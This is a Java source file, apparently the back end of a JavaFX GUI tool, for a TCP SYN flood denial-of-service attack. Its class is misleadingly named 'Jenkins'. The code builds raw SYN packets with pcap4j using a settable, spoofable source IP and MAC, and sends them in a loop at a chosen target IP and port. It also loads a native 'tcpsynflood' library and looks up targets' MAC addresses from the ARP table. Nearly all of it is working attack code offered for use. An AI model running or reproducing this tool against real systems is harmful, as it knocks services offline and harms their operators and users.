package com.yourpackage;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.packet.namednumber.IpNumber;
import org.pcap4j.packet.namednumber.TcpPort;
import org.pcap4j.util.MacAddress;

import java.util.Enumeration;
import java.util.List;
import java.util.ArrayList;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.logging.Logger;

public class Jenkins {
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private TextArea logArea;

    // Load the native library
    static {
        try {
            System.out.println("Attempting to load native library: tcpsynflood");
            System.out.println("Java library path: " + System.getProperty("java.library.path"));
            System.loadLibrary("tcpsynflood");
            System.out.println("Native library loaded: tcpsynflood");
        } catch (UnsatisfiedLinkError e) {
            System.err.println("Failed to load native library: " + e.getMessage());
        }
    }

    // Native methods for TCP SYN flood and stopping the attack
    public native int tcpSynFloodJNI(String targetIp, int targetPort, long bytesPerSecond, String sourceIp, String sourceMac, String networkCard);
    public native void nativeStopAttack();

    // Method to initiate TCP SYN flood attack
    public void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond, ChartUpdateCallback chartCallback, String sourceIp, String sourceMac, String networkCard) {
        log("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes per second");
        stopAttack = false;

        new Thread(() -> {
            try {
                log("Attempting to start TCP SYN flood with source IP: " + sourceIp + ", source MAC: " + sourceMac + ", and network card: " + networkCard);
                sendTcpSynFlood(targetIp, targetPort, sourceIp, sourceMac, networkCard);
            } catch (Exception e) {
                log("Error in TCP SYN flood: " + e.getMessage());
                e.printStackTrace();
            }
            log("TCP SYN flood attack stopped");
        }).start();
    }

    // Method to send TCP SYN flood using pcap4j
    private void sendTcpSynFlood(String targetIp, int targetPort, String sourceIp, String sourceMac, String networkCard) throws Exception {
        PcapNetworkInterface nif = Pcaps.getDevByName(networkCard);
        if (nif == null) {
            throw new IllegalArgumentException("Network interface not found: " + networkCard);
        }

        PcapHandle handle = nif.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);

        MacAddress srcMacAddr = MacAddress.getByName(sourceMac);
        MacAddress dstMacAddr = MacAddress.getByName("ff:ff:ff:ff:ff:ff"); // Broadcast address

        InetAddress srcIpAddr = InetAddress.getByName(sourceIp);
        InetAddress dstIpAddr = InetAddress.getByName(targetIp);

        TcpPacket.Builder tcpBuilder = new TcpPacket.Builder()
                .srcPort(TcpPort.getInstance((short) 12345))
                .dstPort(TcpPort.getInstance((short) targetPort))
                .sequenceNumber((long) (Math.random() * 10000))
                .acknowledgmentNumber(0L)
                .dataOffset((byte) 5)
                .urgent(false)
                .ack(false)
                .psh(false)
                .rst(false)
                .syn(true)
                .fin(false)
                .window((short) 32767)
                .checksum((short) 0) // Will be recalculated
                .urgentPointer((short) 0);

        IpV4Packet.Builder ipBuilder = new IpV4Packet.Builder()
                .version(IpVersion.IPV4)
                .tos(IpV4Rfc791Tos.newInstance((byte) 0))
                .ttl((byte) 64)
                .protocol(IpNumber.TCP)
                .srcAddr((Inet4Address) srcIpAddr)
                .dstAddr((Inet4Address) dstIpAddr)
                .payloadBuilder(tcpBuilder)
                .correctChecksumAtBuild(true)
                .correctLengthAtBuild(true);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder()
                .dstAddr(dstMacAddr)
                .srcAddr(srcMacAddr)
                .type(EtherType.IPV4)
                .payloadBuilder(ipBuilder)
                .paddingAtBuild(true);

        Packet synPacket = etherBuilder.build();

        while (!stopAttack) {
            handle.sendPacket(synPacket);
            Thread.sleep(10); // Adjust the delay as needed
        }

        handle.close();
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
        try {
            nativeStopAttack();
            log("Stop attack flag set to true");
        } catch (UnsatisfiedLinkError e) {
            log("Failed to stop the attack: Native method not implemented - " + e.getMessage());
        }
    }

    // Method to get the MAC address of a target IP
    public String getMacAddress(String targetIp) {
        log("Attempting to retrieve MAC address for IP: " + targetIp);
        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            String mac = getDestinationMacAddress(targetAddress);
            if (mac == null) {
                log("MAC address could not be retrieved for IP: " + targetIp);
                return null;
            }
            log("MAC address retrieved: " + mac);
            return mac;
        } catch (Exception e) {
            log("Error retrieving MAC address: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    // Helper method to resolve MAC address from ARP table
    private String getDestinationMacAddress(InetAddress targetAddress) {
        try {
            String targetIp = targetAddress.getHostAddress();
            log("Running ARP command to find MAC address for IP: " + targetIp);
            ProcessBuilder pb = new ProcessBuilder("arp", "-a", targetIp);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println("ARP output line: " + line);
                if (line.contains(targetIp)) {
                    String[] parts = line.split("\\s+");
                    for (String part : parts) {
                        if (part.matches("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")) {
                            return part;
                        }
                    }
                }
            }
            log("MAC address not found in ARP cache for IP: " + targetIp);
            return null;
        } catch (Exception e) {
            log("Error in ARP resolution: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    // Method to get network devices
    public List<String> getNetworkDevices() {
        log("Retrieving network devices...");
        List<String> devices = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();
                String deviceInfo = networkInterface.getName() + " - " + networkInterface.getDisplayName();
                log("Found network device: " + deviceInfo);
                devices.add(deviceInfo);
            }
        } catch (Exception e) {
            log("Error retrieving network devices: " + e.getMessage());
        }
        return devices;
    }

    // Method to set the source IP
    public void setSourceIp(String sourceIp) {
        log("Source IP set to: " + sourceIp);
    }

    // Method to set the source MAC address
    public void setSourceMac(byte[] sourceMac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < sourceMac.length; i++) {
            sb.append(String.format("%02X%s", sourceMac[i], (i < sourceMac.length - 1) ? ":" : ""));
        }
        log("Source MAC set to: " + sb.toString());
    }

    // Method to set the TextArea for logging purposes
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(java.time.LocalDateTime.now().format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
            });
        }
        System.out.println(message);
    }

    // ChartUpdateCallback Interface
    public interface ChartUpdateCallback {
        void update(double elapsedTimeSeconds, double actualMbps);
    }
}
